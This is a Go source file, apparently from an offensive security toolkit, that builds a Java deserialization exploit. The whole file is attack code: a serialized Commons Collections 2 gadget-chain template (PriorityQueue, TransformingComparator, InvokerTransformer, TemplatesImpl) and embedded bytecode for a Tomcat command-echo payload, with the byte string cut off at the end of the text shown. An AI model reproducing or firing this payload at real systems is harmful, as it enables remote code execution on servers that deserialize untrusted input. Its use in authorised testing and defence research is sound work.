package yso

import (
	"bytes"
	"strconv"
	"yaklang/common/yak/yaklib/codec"
	"yaklang/common/yserx"
)

type debugWriter struct {
}

func (d *debugWriter) Write(i []byte) (int, error) {
	println(strconv.Quote(string(i)))
	return len(i), nil
}

var debugWriterIns = &debugWriter{}

func GetEchoCommonsCollections2() GadgetFunc {
	return func(cmd string) (yserx.JavaSerializable, error) {
		tmp := `[
  {
    "type": 115,
    "type_verbose": "TC_OBJECT",
    "class_desc": {
      "type": 0,
      "type_verbose": "X_CLASSDESC",
      "detail": {
        "type": 114,
        "type_verbose": "TC_CLASSDESC",
        "is_null": false,
        "class_name": "java.util.PriorityQueue",
        "serial_version": "lNowtPs/grE=",
        "handle": 8257536,
        "desc_flag": 3,
        "fields": {
          "type": 0,
          "type_verbose": "X_CLASSFIELDS",
          "field_count": 2,
          "fields": [
            {
              "type": 0,
              "type_verbose": "X_CLASSFIELD",
              "name": "size",
              "field_type": 73,
              "field_type_verbose": "int",
              "class_name_1": null
            },
            {
              "type": 0,
              "type_verbose": "X_CLASSFIELD",
              "name": "comparator",
              "field_type": 76,
              "field_type_verbose": "object",
              "class_name_1": {
                "type": 116,
                "type_verbose": "TC_STRING",
                "is_long": false,
                "size": 22,
                "raw": "TGphdmEvdXRpbC9Db21wYXJhdG9yOw==",
                "value": "Ljava/util/Comparator;",
                "handle": 0
              }
            }
          ]
        },
        "annotations": null,
        "super_class": {
          "type": 112,
          "type_verbose": "TC_NULL"
        },
        "dynamic_proxy_class": false,
        "dynamic_proxy_class_interface_count": 0,
        "dynamic_proxy_annotation": null,
        "dynamic_proxy_class_interface_names": null
      }
    },
    "class_data": [
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": null,
        "block_data": null
      },
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": [
          {
            "type": 0,
            "type_verbose": "X_FIELDVALUE",
            "field_type": 73,
            "field_type_verbose": "int",
            "bytes": "AAAAAg=="
          },
          {
            "type": 0,
            "type_verbose": "X_FIELDVALUE",
            "field_type": 76,
            "field_type_verbose": "object",
            "object": {
              "type": 115,
              "type_verbose": "TC_OBJECT",
              "class_desc": {
                "type": 0,
                "type_verbose": "X_CLASSDESC",
                "detail": {
                  "type": 114,
                  "type_verbose": "TC_CLASSDESC",
                  "is_null": false,
                  "class_name": "org.apache.commons.collections4.comparators.TransformingComparator",
                  "serial_version": "L/mE8CuxCMw=",
                  "handle": 8257539,
                  "desc_flag": 2,
                  "fields": {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELDS",
                    "field_count": 2,
                    "fields": [
                      {
                        "type": 0,
                        "type_verbose": "X_CLASSFIELD",
                        "name": "decorated",
                        "field_type": 76,
                        "field_type_verbose": "object",
                        "class_name_1": {
                          "type": 113,
                          "type_verbose": "TC_REFERENCE",
                          "value": "AH4AAQ==",
                          "handle": 8257537
                        }
                      },
                      {
                        "type": 0,
                        "type_verbose": "X_CLASSFIELD",
                        "name": "transformer",
                        "field_type": 76,
                        "field_type_verbose": "object",
                        "class_name_1": {
                          "type": 116,
                          "type_verbose": "TC_STRING",
                          "is_long": false,
                          "size": 45,
                          "raw": "TG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9uczQvVHJhbnNmb3JtZXI7",
                          "value": "Lorg/apache/commons/collections4/Transformer;",
                          "handle": 0
                        }
                      }
                    ]
                  },
                  "annotations": null,
                  "super_class": {
                    "type": 112,
                    "type_verbose": "TC_NULL"
                  },
                  "dynamic_proxy_class": false,
                  "dynamic_proxy_class_interface_count": 0,
                  "dynamic_proxy_annotation": null,
                  "dynamic_proxy_class_interface_names": null
                }
              },
              "class_data": [
                {
                  "type": 0,
                  "type_verbose": "X_CLASSDATA",
                  "fields": null,
                  "block_data": null
                },
                {
                  "type": 0,
                  "type_verbose": "X_CLASSDATA",
                  "fields": [
                    {
                      "type": 0,
                      "type_verbose": "X_FIELDVALUE",
                      "field_type": 76,
                      "field_type_verbose": "object",
                      "object": {
                        "type": 115,
                        "type_verbose": "TC_OBJECT",
                        "class_desc": {
                          "type": 0,
                          "type_verbose": "X_CLASSDESC",
                          "detail": {
                            "type": 114,
                            "type_verbose": "TC_CLASSDESC",
                            "is_null": false,
                            "class_name": "org.apache.commons.collections4.comparators.ComparableComparator",
                            "serial_version": "+/SZJbhusTc=",
                            "handle": 8257542,
                            "desc_flag": 2,
                            "fields": {
                              "type": 0,
                              "type_verbose": "X_CLASSFIELDS",
                              "field_count": 0,
                              "fields": null
                            },
                            "annotations": null,
                            "super_class": {
                              "type": 112,
                              "type_verbose": "TC_NULL"
                            },
                            "dynamic_proxy_class": false,
                            "dynamic_proxy_class_interface_count": 0,
                            "dynamic_proxy_annotation": null,
                            "dynamic_proxy_class_interface_names": null
                          }
                        },
                        "class_data": [
                          {
                            "type": 0,
                            "type_verbose": "X_CLASSDATA",
                            "fields": null,
                            "block_data": null
                          },
                          {
                            "type": 0,
                            "type_verbose": "X_CLASSDATA",
                            "fields": null,
                            "block_data": null
                          }
                        ],
                        "handle": 8257543
                      }
                    },
                    {
                      "type": 0,
                      "type_verbose": "X_FIELDVALUE",
                      "field_type": 76,
                      "field_type_verbose": "object",
                      "object": {
                        "type": 115,
                        "type_verbose": "TC_OBJECT",
                        "class_desc": {
                          "type": 0,
                          "type_verbose": "X_CLASSDESC",
                          "detail": {
                            "type": 114,
                            "type_verbose": "TC_CLASSDESC",
                            "is_null": false,
                            "class_name": "org.apache.commons.collections4.functors.InvokerTransformer",
                            "serial_version": "h+j/a3t8zjg=",
                            "handle": 8257544,
                            "desc_flag": 2,
                            "fields": {
                              "type": 0,
                              "type_verbose": "X_CLASSFIELDS",
                              "field_count": 3,
                              "fields": [
                                {
                                  "type": 0,
                                  "type_verbose": "X_CLASSFIELD",
                                  "name": "iArgs",
                                  "field_type": 91,
                                  "field_type_verbose": "array",
                                  "class_name_1": {
                                    "type": 116,
                                    "type_verbose": "TC_STRING",
                                    "is_long": false,
                                    "size": 19,
                                    "raw": "W0xqYXZhL2xhbmcvT2JqZWN0Ow==",
                                    "value": "[Ljava/lang/Object;",
                                    "handle": 0
                                  }
                                },
                                {
                                  "type": 0,
                                  "type_verbose": "X_CLASSFIELD",
                                  "name": "iMethodName",
                                  "field_type": 76,
                                  "field_type_verbose": "object",
                                  "class_name_1": {
                                    "type": 116,
                                    "type_verbose": "TC_STRING",
                                    "is_long": false,
                                    "size": 18,
                                    "raw": "TGphdmEvbGFuZy9TdHJpbmc7",
                                    "value": "Ljava/lang/String;",
                                    "handle": 0
                                  }
                                },
                                {
                                  "type": 0,
                                  "type_verbose": "X_CLASSFIELD",
                                  "name": "iParamTypes",
                                  "field_type": 91,
                                  "field_type_verbose": "array",
                                  "class_name_1": {
                                    "type": 116,
                                    "type_verbose": "TC_STRING",
                                    "is_long": false,
                                    "size": 18,
                                    "raw": "W0xqYXZhL2xhbmcvQ2xhc3M7",
                                    "value": "[Ljava/lang/Class;",
                                    "handle": 0
                                  }
                                }
                              ]
                            },
                            "annotations": null,
                            "super_class": {
                              "type": 112,
                              "type_verbose": "TC_NULL"
                            },
                            "dynamic_proxy_class": false,
                            "dynamic_proxy_class_interface_count": 0,
                            "dynamic_proxy_annotation": null,
                            "dynamic_proxy_class_interface_names": null
                          }
                        },
                        "class_data": [
                          {
                            "type": 0,
                            "type_verbose": "X_CLASSDATA",
                            "fields": null,
                            "block_data": null
                          },
                          {
                            "type": 0,
                            "type_verbose": "X_CLASSDATA",
                            "fields": [
                              {
                                "type": 0,
                                "type_verbose": "X_FIELDVALUE",
                                "field_type": 91,
                                "field_type_verbose": "array",
                                "object": {
                                  "type": 117,
                                  "type_verbose": "TC_ARRAY",
                                  "class_desc": {
                                    "type": 0,
                                    "type_verbose": "X_CLASSDESC",
                                    "detail": {
                                      "type": 114,
                                      "type_verbose": "TC_CLASSDESC",
                                      "is_null": false,
                                      "class_name": "[Ljava.lang.Object;",
                                      "serial_version": "kM5YnxBzKWw=",
                                      "handle": 8257549,
                                      "desc_flag": 2,
                                      "fields": {
                                        "type": 0,
                                        "type_verbose": "X_CLASSFIELDS",
                                        "field_count": 0,
                                        "fields": null
                                      },
                                      "annotations": null,
                                      "super_class": {
                                        "type": 112,
                                        "type_verbose": "TC_NULL"
                                      },
                                      "dynamic_proxy_class": false,
                                      "dynamic_proxy_class_interface_count": 0,
                                      "dynamic_proxy_annotation": null,
                                      "dynamic_proxy_class_interface_names": null
                                    }
                                  },
                                  "size": 0,
                                  "values": null,
                                  "handle": 8257550
                                }
                              },
                              {
                                "type": 0,
                                "type_verbose": "X_FIELDVALUE",
                                "field_type": 76,
                                "field_type_verbose": "object",
                                "object": {
                                  "type": 116,
                                  "type_verbose": "TC_STRING",
                                  "is_long": false,
                                  "size": 14,
                                  "raw": "bmV3VHJhbnNmb3JtZXI=",
                                  "value": "newTransformer",
                                  "handle": 0
                                }
                              },
                              {
                                "type": 0,
                                "type_verbose": "X_FIELDVALUE",
                                "field_type": 91,
                                "field_type_verbose": "array",
                                "object": {
                                  "type": 117,
                                  "type_verbose": "TC_ARRAY",
                                  "class_desc": {
                                    "type": 0,
                                    "type_verbose": "X_CLASSDESC",
                                    "detail": {
                                      "type": 114,
                                      "type_verbose": "TC_CLASSDESC",
                                      "is_null": false,
                                      "class_name": "[Ljava.lang.Class;",
                                      "serial_version": "qxbXrsvNWpk=",
                                      "handle": 8257552,
                                      "desc_flag": 2,
                                      "fields": {
                                        "type": 0,
                                        "type_verbose": "X_CLASSFIELDS",
                                        "field_count": 0,
                                        "fields": null
                                      },
                                      "annotations": null,
                                      "super_class": {
                                        "type": 112,
                                        "type_verbose": "TC_NULL"
                                      },
                                      "dynamic_proxy_class": false,
                                      "dynamic_proxy_class_interface_count": 0,
                                      "dynamic_proxy_annotation": null,
                                      "dynamic_proxy_class_interface_names": null
                                    }
                                  },
                                  "size": 0,
                                  "values": null,
                                  "handle": 8257553
                                }
                              }
                            ],
                            "block_data": null
                          }
                        ],
                        "handle": 8257548
                      }
                    }
                  ],
                  "block_data": null
                }
              ],
              "handle": 8257541
            }
          }
        ],
        "block_data": [
          {
            "type": 119,
            "type_verbose": "TC_BLOCKDATA",
            "is_long": false,
            "size": 4,
            "contents": "AAAAAw=="
          },
          {
            "type": 115,
            "type_verbose": "TC_OBJECT",
            "class_desc": {
              "type": 0,
              "type_verbose": "X_CLASSDESC",
              "detail": {
                "type": 114,
                "type_verbose": "TC_CLASSDESC",
                "is_null": false,
                "class_name": "org.apache.xalan.xsltc.trax.TemplatesImpl",
                "serial_version": "CVdPwW6sqzM=",
                "handle": 8257554,
                "desc_flag": 3,
                "fields": {
                  "type": 0,
                  "type_verbose": "X_CLASSFIELDS",
                  "field_count": 7,
                  "fields": [
                    {
                      "type": 0,
                      "type_verbose": "X_CLASSFIELD",
                      "name": "_indentNumber",
                      "field_type": 73,
                      "field_type_verbose": "int",
                      "class_name_1": null
                    },
                    {
                      "type": 0,
                      "type_verbose": "X_CLASSFIELD",
                      "name": "_transletIndex",
                      "field_type": 73,
                      "field_type_verbose": "int",
                      "class_name_1": null
                    },
                    {
                      "type": 0,
                      "type_verbose": "X_CLASSFIELD",
                      "name": "_auxClasses",
                      "field_type": 76,
                      "field_type_verbose": "object",
                      "class_name_1": {
                        "type": 116,
                        "type_verbose": "TC_STRING",
                        "is_long": false,
                        "size": 42,
                        "raw": "TG9yZy9hcGFjaGUveGFsYW4veHNsdGMvcnVudGltZS9IYXNodGFibGU7",
                        "value": "Lorg/apache/xalan/xsltc/runtime/Hashtable;",
                        "handle": 0
                      }
                    },
                    {
                      "type": 0,
                      "type_verbose": "X_CLASSFIELD",
                      "name": "_bytecodes",
                      "field_type": 91,
                      "field_type_verbose": "array",
                      "class_name_1": {
                        "type": 116,
                        "type_verbose": "TC_STRING",
                        "is_long": false,
                        "size": 3,
                        "raw": "W1tC",
                        "value": "[[B",
                        "handle": 0
                      }
                    },
                    {
                      "type": 0,
                      "type_verbose": "X_CLASSFIELD",
                      "name": "_class",
                      "field_type": 91,
                      "field_type_verbose": "array",
                      "class_name_1": {
                        "type": 113,
                        "type_verbose": "TC_REFERENCE",
                        "value": "AH4ACw==",
                        "handle": 8257547
                      }
                    },
                    {
                      "type": 0,
                      "type_verbose": "X_CLASSFIELD",
                      "name": "_name",
                      "field_type": 76,
                      "field_type_verbose": "object",
                      "class_name_1": {
                        "type": 113,
                        "type_verbose": "TC_REFERENCE",
                        "value": "AH4ACg==",
                        "handle": 8257546
                      }
                    },
                    {
                      "type": 0,
                      "type_verbose": "X_CLASSFIELD",
                      "name": "_outputProperties",
                      "field_type": 76,
                      "field_type_verbose": "object",
                      "class_name_1": {
                        "type": 116,
                        "type_verbose": "TC_STRING",
                        "is_long": false,
                        "size": 22,
                        "raw": "TGphdmEvdXRpbC9Qcm9wZXJ0aWVzOw==",
                        "value": "Ljava/util/Properties;",
                        "handle": 0
                      }
                    }
                  ]
                },
                "annotations": null,
                "super_class": {
                  "type": 112,
                  "type_verbose": "TC_NULL"
                },
                "dynamic_proxy_class": false,
                "dynamic_proxy_class_interface_count": 0,
                "dynamic_proxy_annotation": null,
                "dynamic_proxy_class_interface_names": null
              }
            },
            "class_data": [
              {
                "type": 0,
                "type_verbose": "X_CLASSDATA",
                "fields": null,
                "block_data": null
              },
              {
                "type": 0,
                "type_verbose": "X_CLASSDATA",
                "fields": [
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 73,
                    "field_type_verbose": "int",
                    "bytes": "AAAAAA=="
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 73,
                    "field_type_verbose": "int",
                    "bytes": "/////w=="
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 76,
                    "field_type_verbose": "object",
                    "object": {
                      "type": 112,
                      "type_verbose": "TC_NULL"
                    }
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 91,
                    "field_type_verbose": "array",
                    "object": {
                      "type": 117,
                      "type_verbose": "TC_ARRAY",
                      "class_desc": {
                        "type": 0,
                        "type_verbose": "X_CLASSDESC",
                        "detail": {
                          "type": 114,
                          "type_verbose": "TC_CLASSDESC",
                          "is_null": false,
                          "class_name": "[[B",
                          "serial_version": "S/0ZFWdn2zc=",
                          "handle": 8257559,
                          "desc_flag": 2,
                          "fields": {
                            "type": 0,
                            "type_verbose": "X_CLASSFIELDS",
                            "field_count": 0,
                            "fields": null
                          },
                          "annotations": null,
                          "super_class": {
                            "type": 112,
                            "type_verbose": "TC_NULL"
                          },
                          "dynamic_proxy_class": false,
                          "dynamic_proxy_class_interface_count": 0,
                          "dynamic_proxy_annotation": null,
                          "dynamic_proxy_class_interface_names": null
                        }
                      },
                      "size": 2,
                      "values": [
                        {
                          "type": 0,
                          "type_verbose": "X_FIELDVALUE",
                          "field_type": 91,
                          "field_type_verbose": "array",
                          "object": {
                            "type": 117,
                            "type_verbose": "TC_ARRAY",
                            "class_desc": {
                              "type": 0,
                              "type_verbose": "X_CLASSDESC",
                              "detail": {
                                "type": 114,
                                "type_verbose": "TC_CLASSDESC",
                                "is_null": false,
                                "class_name": "[B",
                                "serial_version": "rPMX+AYIVOA=",
                                "handle": 8257561,
                                "desc_flag": 2,
                                "fields": {
                                  "type": 0,
                                  "type_verbose": "X_CLASSFIELDS",
                                  "field_count": 0,
                                  "fields": null
                                },
                                "annotations": null,
                                "super_class": {
                                  "type": 112,
                                  "type_verbose": "TC_NULL"
                                },
                                "dynamic_proxy_class": false,
                                "dynamic_proxy_class_interface_count": 0,
                                "dynamic_proxy_annotation": null,
                                "dynamic_proxy_class_interface_names": null
                              }
                            },
                            "size": {{ .size }},
                            "values": null,
                            "handle": 8257562,
                            "bytescode": true,
                            "bytes": "{{ .Base64Tmpl }}"
                          }
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_FIELDVALUE",
                          "field_type": 91,
                          "field_type_verbose": "array",
                          "object": {
                            "type": 117,
                            "type_verbose": "TC_ARRAY",
                            "class_desc": {
                              "type": 113,
                              "type_verbose": "TC_REFERENCE",
                              "value": "AH4AGQ==",
                              "handle": 8257561
                            },
                            "size": 468,
                            "values": null,
                            "handle": 8257563,
                            "bytescode": true,
                            "bytes": "yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJ"
                          }
                        }
                      ],
                      "handle": 8257560
                    }
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 91,
                    "field_type_verbose": "array",
                    "object": {
                      "type": 112,
                      "type_verbose": "TC_NULL"
                    }
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 76,
                    "field_type_verbose": "object",
                    "object": {
                      "type": 116,
                      "type_verbose": "TC_STRING",
                      "is_long": false,
                      "size": 7,
                      "raw": "dGVzdENtZA==",
                      "value": "testCmd",
                      "handle": 0
                    }
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 76,
                    "field_type_verbose": "object",
                    "object": {
                      "type": 112,
                      "type_verbose": "TC_NULL"
                    }
                  }
                ],
                "block_data": [
                  {
                    "type": 119,
                    "type_verbose": "TC_BLOCKDATA",
                    "is_long": false,
                    "size": 1,
                    "contents": "AA=="
                  },
                  {
                    "type": 120,
                    "type_verbose": "TC_ENDBLOCKDATA"
                  }
                ]
              }
            ],
            "handle": 8257558
          },
          {
            "type": 115,
            "type_verbose": "TC_OBJECT",
            "class_desc": {
              "type": 0,
              "type_verbose": "X_CLASSDESC",
              "detail": {
                "type": 114,
                "type_verbose": "TC_CLASSDESC",
                "is_null": false,
                "class_name": "java.lang.Integer",
                "serial_version": "EuKgpPeBhzg=",
                "handle": 8257565,
                "desc_flag": 2,
                "fields": {
                  "type": 0,
                  "type_verbose": "X_CLASSFIELDS",
                  "field_count": 1,
                  "fields": [
                    {
                      "type": 0,
                      "type_verbose": "X_CLASSFIELD",
                      "name": "value",
                      "field_type": 73,
                      "field_type_verbose": "int",
                      "class_name_1": null
                    }
                  ]
                },
                "annotations": null,
                "super_class": {
                  "type": 0,
                  "type_verbose": "X_CLASSDESC",
                  "detail": {
                    "type": 114,
                    "type_verbose": "TC_CLASSDESC",
                    "is_null": false,
                    "class_name": "java.lang.Number",
                    "serial_version": "hqyVHQuU4Is=",
                    "handle": 8257566,
                    "desc_flag": 2,
                    "fields": {
                      "type": 0,
                      "type_verbose": "X_CLASSFIELDS",
                      "field_count": 0,
                      "fields": null
                    },
                    "annotations": null,
                    "super_class": {
                      "type": 112,
                      "type_verbose": "TC_NULL"
                    },
                    "dynamic_proxy_class": false,
                    "dynamic_proxy_class_interface_count": 0,
                    "dynamic_proxy_annotation": null,
                    "dynamic_proxy_class_interface_names": null
                  }
                },
                "dynamic_proxy_class": false,
                "dynamic_proxy_class_interface_count": 0,
                "dynamic_proxy_annotation": null,
                "dynamic_proxy_class_interface_names": null
              }
            },
            "class_data": [
              {
                "type": 0,
                "type_verbose": "X_CLASSDATA",
                "fields": null,
                "block_data": null
              },
              {
                "type": 0,
                "type_verbose": "X_CLASSDATA",
                "fields": null,
                "block_data": null
              },
              {
                "type": 0,
                "type_verbose": "X_CLASSDATA",
                "fields": [
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 73,
                    "field_type_verbose": "int",
                    "bytes": "AAAAAQ=="
                  }
                ],
                "block_data": null
              }
            ],
            "handle": 8257567
          },
          {
            "type": 120,
            "type_verbose": "TC_ENDBLOCKDATA"
          }
        ]
      }
    ],
    "handle": 8257538
  }
]`
		tmpp, err := buildTemplate("testCmd", tmp)
		if err != nil {
			return nil, err
		}

		echoTmplClass := []byte("\xca\xfe\xba\xbe\x00\x00\x00\x34\x01\x16\x0a\x00\x4b\x00\x90\x08\x00\x91\x0a\x00\x06\x00\x92\x0a\x00\x06\x00\x93\x08\x00\x94\x07\x00\x95\x07\x00\x5e\x09\x00\x0b\x00\x96\x0a\x00\x06\x00\x97\x07\x00\x98\x07\x00\x99\x0a\x00\x0b\x00\x9a\x0a\x00\x9b\x00\x9c\x0a\x00\x0a\x00\x9d\x08\x00\x9e\x0a\x00\x06\x00\x9f\x07\x00\xa0\x08\x00\xa1\x08\x00\xa2\x0a\x00\x06\x00\xa3\x07\x00\xa4\x0a\x00\x06\x00\xa5\x0a\x00\x15\x00\xa6\x0a\x00\xa7\x00\xa8\x0a\x00\xa7\x00\xa9\x0a\x00\xaa\x00\xab\x0a\x00\xaa\x00\xac\x08\x00\xad\x0a\x00\x4a\x00\xae\x07\x00\x87\x0a\x00\xaa\x00\xaf\x08\x00\xb0\x0a\x00\x30\x00\xb1\x08\x00\xb2\x08\x00\xb3\x07\x00\xb4\x08\x00\xb5\x08\x00\xb6\x08\x00\xb7\x07\x00\xb8\x08\x00\xb9\x07\x00\xba\x0b\x00\x2a\x00\xbb\x0b\x00\x2a\x00\xbc\x08\x00\xbd\x08\x00\xbe\x08\x00\xbf\x07\x00\xc0\x08\x00\xc1\x08\x00\xc2\x08\x00\xc3\x0a\x00\x30\x00\xc4\x08\x00\xc5\x08\x00\xc6\x0a\x00\xc7\x00\xc8\x0a\x00\x30\x00\xc9\x08\x00\xca\x08\x00\xcb\x08\x00\xcc\x08\x00\xcd\x08\x00\xce\x07\x00\xcf\x07\x00\xd0\x0a\x00\x3f\x00\xd1\x0a\x00\x3f\x00\xd2\x0a\x00\xd3\x00\xd4\x0a\x00\x3e\x00\xd5\x08\x00\xd6\x0a\x00\x3e\x00\xd7\x0a\x00\x3e\x00\xd8\x0a\x00\x30\x00\xd9\x0a\x00\x4a\x00\xda\x0a\x00\x28\x00\xdb\x07\x00\xdc\x07\x00\xdd\x07\x00\xde\x01\x00\x06\x3c\x69\x6e\x69\x74\x3e\x01\x00\x03\x28\x29\x56\x01\x00\x04\x43\x6f\x64\x65\x01\x00\x0f\x4c\x69\x6e\x65\x4e\x75\x6d\x62\x65\x72\x54\x61\x62\x6c\x65\x01\x00\x12\x4c\x6f\x63\x61\x6c\x56\x61\x72\x69\x61\x62\x6c\x65\x54\x61\x62\x6c\x65\x01\x00\x04\x74\x68\x69\x73\x01\x00\x14\x4c\x54\x6f\x6d\x63\x61\x74\x45\x63\x68\x6f\x54\x65\x6d\x70\x6c\x61\x74\x65\x3b\x01\x00\x09\x77\x72\x69\x74\x65\x42\x6f\x64\x79\x01\x00\x17\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x5b\x42\x29\x56\x01\x00\x04\x76\x61\x72\x32\x01\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x01\x00\x04\x76\x61\x72\x33\x01\x00\x11\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x01\x00\x04\x76\x61\x72\x35\x01\x00\x21\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4e\x6f\x53\x75\x63\x68\x4d\x65\x74\x68\x6f\x64\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x3b\x01\x00\x04\x76\x61\x72\x30\x01\x00\x04\x76\x61\x72\x31\x01\x00\x02\x5b\x42\x01\x00\x0d\x53\x74\x61\x63\x6b\x4d\x61\x70\x54\x61\x62\x6c\x65\x07\x00\xa0\x07\x00\x98\x07\x00\x95\x01\x00\x0a\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x73\x01\x00\x05\x67\x65\x74\x46\x56\x01\x00\x38\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x01\x00\x20\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4e\x6f\x53\x75\x63\x68\x46\x69\x65\x6c\x64\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x3b\x01\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x01\x00\x19\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x46\x69\x65\x6c\x64\x3b\x07\x00\xdf\x07\x00\xa4\x01\x00\x09\x74\x72\x61\x6e\x73\x66\x6f\x72\x6d\x01\x00\x50\x28\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x78\x61\x6c\x61\x6e\x2f\x78\x73\x6c\x74\x63\x2f\x44\x4f\x4d\x3b\x5b\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x78\x6d\x6c\x2f\x73\x65\x72\x69\x61\x6c\x69\x7a\x65\x72\x2f\x53\x65\x72\x69\x61\x6c\x69\x7a\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x29\x56\x01\x00\x03\x64\x6f\x6d\x01\x00\x1c\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x78\x61\x6c\x61\x6e\x2f\x78\x73\x6c\x74\x63\x2f\x44\x4f\x4d\x3b\x01\x00\x15\x73\x65\x72\x69\x61\x6c\x69\x7a\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x73\x01\x00\x31\x5b\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x78\x6d\x6c\x2f\x73\x65\x72\x69\x61\x6c\x69\x7a\x65\x72\x2f\x53\x65\x72\x69\x61\x6c\x69\x7a\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x07\x00\xe0\x01\x00\x73\x28\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x78\x61\x6c\x61\x6e\x2f\x78\x73\x6c\x74\x63\x2f\x44\x4f\x4d\x3b\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x78\x6d\x6c\x2f\x64\x74\x6d\x2f\x44\x54\x4d\x41\x78\x69\x73\x49\x74\x65\x72\x61\x74\x6f\x72\x3b\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x78\x6d\x6c\x2f\x73\x65\x72\x69\x61\x6c\x69\x7a\x65\x72\x2f\x53\x65\x72\x69\x61\x6c\x69\x7a\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x29\x56\x01\x00\x0f\x64\x74\x6d\x41\x78\x69\x73\x49\x74\x65\x72\x61\x74\x6f\x72\x01\x00\x24\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x78\x6d\x6c\x2f\x64\x74\x6d\x2f\x44\x54\x4d\x41\x78\x69\x73\x49\x74\x65\x72\x61\x74\x6f\x72\x3b\x01\x00\x14\x73\x65\x72\x69\x61\x6c\x69\x7a\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x01\x00\x30\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x78\x6d\x6c\x2f\x73\x65\x72\x69\x61\x6c\x69\x7a\x65\x72\x2f\x53\x65\x72\x69\x61\x6c\x69\x7a\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x01\x00\x08\x3c\x63\x6c\x69\x6e\x69\x74\x3e\x01\x00\x05\x76\x61\x72\x31\x33\x01\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x3b\x01\x00\x05\x76\x61\x72\x31\x32\x01\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x01\x00\x05\x76\x61\x72\x31\x31\x01\x00\x05\x76\x61\x72\x31\x35\x01\x00\x05\x76\x61\x72\x31\x30\x01\x00\x01\x49\x01\x00\x04\x76\x61\x72\x39\x01\x00\x10\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4c\x69\x73\x74\x3b\x01\x00\x04\x76\x61\x72\x37\x01\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x6